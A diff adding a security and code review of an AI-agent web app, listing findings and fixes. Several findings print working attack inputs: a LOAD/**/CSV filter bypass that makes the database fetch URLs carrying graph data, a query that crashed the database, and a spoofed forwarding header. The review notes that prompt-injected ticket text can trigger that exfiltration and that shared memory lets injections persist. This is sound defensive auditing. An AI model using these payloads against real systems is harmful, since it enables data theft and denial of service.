@@ -106,3 +106,104 @@ Security checks that came back clean:
 - **Stop the footer clock off-screen.** `landing/src/sections/Close.tsx:74` runs a 1-second interval forever. Run it only while the footer is in view.
 
 net: about -360 lines possible, -0 deps.
+
+# Final review (Gate 2, `/ponytail-review` + security pass)
+
+Date: 2026-10-18 · Scope: `git diff 15628da..HEAD` at a3b95ab, without node_modules, dist, data/ and lockfiles. The focus was sim/, agent/api, agent/queries/graph-tools.ts, agent/memory.ts, agent/stories.ts, ui chat and story-panel, bench arm E and merge, and gen/embed.ts. Nothing was edited.
+
+The probes ran against the local FalkorDB v4.22.1 as `mochi_reader`. One of them (`UNWIND range(1,300000000)`) killed the container. It restarted and reloaded from the AOF in about 8 s. See must-fix F2.
+
+## The six early must-fixes: re-check
+
+| # | Status | Evidence |
+|---|---|---|
+| 1 CSS breakout | **Fixed** | `contracts/html-guard.ts:13` rejects `<`. `cssSources` (`:31-35`) covers `h.css`, `<style>` blocks and inline styles. Rerunning the original exploit now returns `{"ok":false}`. |
+| 2 open `/api/dream/run` | **Fixed**, with one gap | `agent/server.ts:79` checks `isAdmin` (`agent/api/visitor.ts:37-40`), and the check fails closed when the token is unset. `json()` sends no CORS headers (`agent/api/index.ts:10-14`). The UI token is dev-only (`ui/src/data/api.ts:113`), and the token is not in `ui/dist`. Gap: `dreamState.running` serializes HTTP runs only, not the scheduled `DreamTask`. See F9. |
+| 3 isolation counts any error | **Fixed** | `bench/runs/isolation.ts:12,18` counts only `NOPERM`, "no permissions" or the read-only error as a refusal. `bench/runs.test.ts:78` asserts this. |
+| 4 circular cluster ablation | **Fixed** | `bench/runs/clusters.ts:1-4,49-52` uses CDLP over the dream's `SIMILAR_TO` and never reads `ABOUT`. Dream tokens are counted (`:44`), and the ledger row says so (`bench/ledger.ts:47`). |
+| 5 blog has no figures | **Fixed** | The `BENCH` block holds `run_at 1792319159413`, identical to `bench/results.json`. The comment at `blog/fill-bench.ts:3` says `fill()` relies on `validateResults` to require a non-null `run_at`. No case-sensitive TODO/PLACEHOLDER markers remain. |
+| 6 fixture numbers in `/app` | **Fixed** | Report and Overview now read through `ui/src/data/api.ts`, and the hardcoded fixture id is gone. Fixtures remain only in `screens/Preview.tsx` and as types. |
+
+## Security pass on the new surfaces
+
+**`query_graph`: is read-only database-enforced?** Yes. `mochi_reader` has only `+GRAPH.RO_QUERY` (`contracts/graph.ts:92`). The user and cust tiers run through `user_demo` but still call `roQuery` (`agent/queries/graph-tools.ts:39`), and FalkorDB refuses writes inside `RO_QUERY` ("graph.RO_QUERY is to be executed only on read-only queries"). `CALL db.idx.fulltext.createNodeIndex` is refused the same way. Other users' graphs: there is only one user graph, `user_demo` (`agent/memory.ts:13`). `mochi_reader` gets NOPERM on it, and `user_demo`'s ACL reaches no other `user_*`. Two holes remain: **LOAD CSV** and **memory**.
+
+**`graph_algorithm`: does model input reach mochi_dream writes?** No. Every interpolated label or edge passes `names()` (`graph-tools.ts:145-149`) or comes from database rows (`labels(a)[0]`). Ids, `area` and the scratch rows are `$params`. `top`, `maxLen` and `depth` go through `clampInt`, so the worst a bad value produces is `NaN` and a syntax error. The scratch graph name comes from the harness graph, never from args.
+
+**Stories:** the owner check holds. `setStoryStatus` (`agent/stories.ts:61`) and `edit_story` (`agent/harness.ts:210`) require `meta.owner === vid`. `visible()` (`stories.ts:39-49`) gives a stranger only the versions in `published`, and gives nothing once the story is unpublished. So `/story/:id@n` on a draft version returns 404, and the WebSocket path uses the same `visible()`. The cookie is `SameSite=Lax`, so a cross-site POST to publish carries no vid. No leak found.
+
+**Sim auth, admin token, chat limit:** see F3, F4, F12 and F13 below.
+
+### Must fix
+
+F1. **`LOAD/**/CSV` bypasses the precheck, and FalkorDB fetches any https URL from inside `RO_QUERY`** (`agent/queries/graph-tools.ts:17,22`).
+- Cause: `strip` deletes comments without leaving a space, so `LOAD/**/CSV` becomes `LOADCSV` and misses `/LOAD\s+CSV/`. Cypher treats a comment as whitespace, so the database still parses `LOAD CSV`. A backtick identifier holding a `'` also derails the string stripper.
+- Verified as `mochi_reader`: `LOAD/**/CSV FROM 'https://raw.githubusercontent.com/…/data.csv'` returned rows, and `MATCH (t:Ticket) … LOAD CSV FROM 'https://…?x=' + t.id` fetched with graph data in the URL.
+- Impact: SSRF from the database host, and an exfiltration channel that prompt-injected ticket or answer text can trigger. Stored receipts re-fetch the URL on every public `GET /api/stories/:id` rerender. The DB ACL cannot stop it, because `LOAD CSV` is a read clause.
+- Smallest fix: test the raw text (not the stripped one) with `/\bLOAD\b/i`, or make `strip` replace comments with `' '` and match `/\bLOAD\b/i`. Add the `LOAD/**/CSV` case to `graph-tools.test.ts`.
+
+F2. **Model-written Cypher can kill FalkorDB** (`docker-compose.yml:17`, `deploy/railway.md:34`).
+- `QUERY_MEM_CAPACITY` is 0, meaning unlimited. One `UNWIND range(1,300000000) AS x RETURN count(x)` as `mochi_reader` killed the container. There was no bug report and `restarts=1`. `TIMEOUT 5000` does not help, because memory runs out first.
+- Any chat visitor can ask for this through `query_graph`, so the live deploy has a one-line DoS.
+- Smallest fix: add `QUERY_MEM_CAPACITY 268435456` (256 MB, per query) to `FALKORDB_ARGS` in both places.
+
+F3. **The chat rate limit can be bypassed with a spoofed header** (`agent/api/visitor.ts:26`).
+- `ipOf` takes the leftmost `X-Forwarded-For` entry, which the client controls. A new random value on each request gets a fresh window every time. It also grows `hits` (`:25`) without bound.
+- Smallest fix: `req.headers['x-real-ip'] ?? XFF.split(',').at(-1)`, which is the hop the proxy adds, falling back to `remoteAddress`.
+
+F4. **`/suggest` runs the agent without the limit** (`agent/server.ts:50`).
+- The limit only matches `/\/run$/`. CopilotKit's `POST /api/copilotkit/agent/mochi/suggest` clones the agent and calls `PiDurableAgent.run` → `conv.submit` (`agent/agui.ts:105,208`): a full model and tool run on our key, with no cap.
+- Smallest fix: `/\/(run|suggest)$/`, or count every POST under `/api/copilotkit`.
+
+### Should fix
+
+F5. **All visitors share one personal memory** (`agent/memory.ts:13`, `agent/harness.ts:140`).
+- Every visitor writes `remember` into `user_demo` under `AgentUser {id: 'A-1'}`. Every briefing's "From your memory" then shows other strangers' text. `query_graph` can also read the whole `user_demo` graph.
+- This is both cross-visitor leakage and prompt-injection persistence.
+- Smallest fix: key the preference node by `caller.vid` (`user: caller.vid ?? caller.user` in `remember` and `readPreferences`), and drop `g === userGraph` from `graphs`. The `ponytail:` note at `memory.ts:11` already names the ceiling. This change keeps the tier.
+
+F6. **The public desk writes into company memory with no cap** (`agent/api/index.ts:42-43`).
+- `POST /api/tickets/:id/answer` resolves sim tickets and appends visitor text to `cust_*` episodes (`agent/api/tickets.ts:133-158`). That text shows in "This customer before" and in the model's context.
+- `/brief` also appends an episode on every call, and `answered` (`tickets.ts:132`) grows per `requestId`.
+- Smallest fix: put `overLimit(ipOf(req))` in front of both POSTs.
+
+F7. **`rerender` breaks stories that cite a user or cust tier query** (`agent/stories.ts:98-100`).
+- It replays every receipt as `mochi_reader`, which has no access to `user_demo` or `cust_*`. A story citing a `query_graph` on those tiers returns 500 on every load.
+- Smallest fix: keep those receipts as snapshots, as scratch ones already are: `if (!/^(mochi_company|team_)/.test(q.graph)) return [qid, q]`.
+
+F8. **The scratch algorithm query has no timeout** (`agent/queries/graph-tools.ts:267`).
+- It runs as `mochi_dream` without `TIMEOUT`. Every other path passes one.
+- Smallest fix: `{ params: …, TIMEOUT: 30_000 }`.
+
+F9. **The manual dream and the scheduled `DreamTask` can still race** (`agent/server.ts:80`, `agent/dream/index.ts:242`).
+- The two runs race on the `prev`/`scratch` copy, and the graph_algorithm lock (`graph-tools.ts:92-95`) does not cover the dream either.
+- Smallest fix: one module-level promise chain in `runDreamNow`, shared with `serial` in graph-tools.
+
+F10. **The merge publishes zeros as if they were measured** (`bench/merge.ts:27`).
+- When no shard has `server`, the merge writes all-zero server figures. This is the same honesty issue as early #14. Today's results.json is real, but the next merge could ship zeros.
+- Smallest fix: throw `server section missing` instead of using the fallback.
+
+F11. **The prod compose reopens FalkorDB on all interfaces** (`docker-compose.prod.yml:8`).
+- `ports: !override ["6380:6379"]` binds 0.0.0.0, which undoes early #11 for prod.
+- Smallest fix: `["127.0.0.1:6380:6379"]`.
+
+### Consider
+
+- F12. **Sim auth fails open to a known key** (`sim/server.ts:38`). `apiKey` defaults to `'sim-key'`, and the agent client has the same default (`agent/api/sim.ts:17`). The sim also listens on all interfaces. It is not deployed publicly yet (`deploy/railway.md:6`), but fix it before it is: refuse to start without `SIM_API_KEY` outside dev, and cap `readBody` (`:113`) as `agent/api/index.ts:18` does.
+- F13. **The admin token check is weak in two ways.** It uses a plain `===` (`agent/api/visitor.ts:39`); use `timingSafeEqual` on equal-length buffers. And `.env.example:25` ships `change-me-admin-token`; have `isAdmin` treat that literal as unset.
+- F14. **Public story reads are unthrottled** (`agent/server.ts:68-75`). Each `GET /api/stories/:id?asOf=` replays every stored query, so the cost of one GET grows with the number of receipts. Fix: cache by `(id, version, asOf rounded to a minute)`, or rate-limit with `overLimit`.
+- F15. **Name checks accept prototype keys** (`graph-tools.ts:114,146-148`; `contracts/graph.ts` `checkCypherNames`). `in L` / `in E` accept `constructor` or `toString`. It is harmless, because no quote can get through, but `Object.hasOwn(L, l)` says what is meant.
+- F16. **A comment overstates the read-only path** (`graph-tools.ts:3`). It says "as mochi_reader", but user and cust tiers run through `user_demo`. They are still `RO_QUERY`, so only the comment needs fixing.
+
+## Over-engineering (`/ponytail-review` of the diff)
+
+- `agent/server.ts:11,78,147`: yagni. `dream-port.ts`/`DREAM_NOT_INSTALLED`/`loadDream` is still a dynamic loader for a dream that has been merged (early consider). Import `./dream/index.ts` directly and delete the 503 branch.
+- `agent/api/visitor.ts:12-13`: delete. There are two stacked doc comments on `cookieVid`, and the first describes `visitorId`. Keep one.
+- `agent/queries/graph-tools.ts:124-125`: stdlib. Hand-rolled grouping. Use `Map.groupBy(rows, (r) => `${r.la}|${r.lb}`)`, as `bench/runs/clusters.ts:52` already does.
+- `agent/queries/graph-tools.ts:62-63,129`: shrink. The inner `const edges` shadows the outer `edges` counter. Rename it `merges`. This is a 3 AM trap, not a bug.
+- `bench/arms/e.ts:258`: delete. `mkdtempSync` is never cleaned up, so each `prepare()` leaves a SQLite file in tmp. Use one path per run, or `rmSync` it in `prepare`.
+- `ui/src/components/chat/README.md`: delete. It is an interface note inside an HTML comment in a component folder. Put the prop types on `Composer`/`MessageList` instead (-14 lines).
+- `ui/src/main.tsx:26` + `screens/Preview.tsx`: yagni. The fixture gallery ships in the prod bundle. Gate it on `import.meta.env.DEV` so fixture numbers never reach the deploy.
+- `sim/`, `gen/embed.ts`, `bench/merge.ts`, `agent/stories.ts`, `agent/memory.ts`, `story-panel.tsx`, the rest of `ui/src/components/chat/`: lean already.
+
+net: about -45 lines possible, -0 deps. Must-fix: 4 (F1–F4), all short diffs. None of these cuts touch receipts, honesty clauses, ACL tiers, validation or tests.
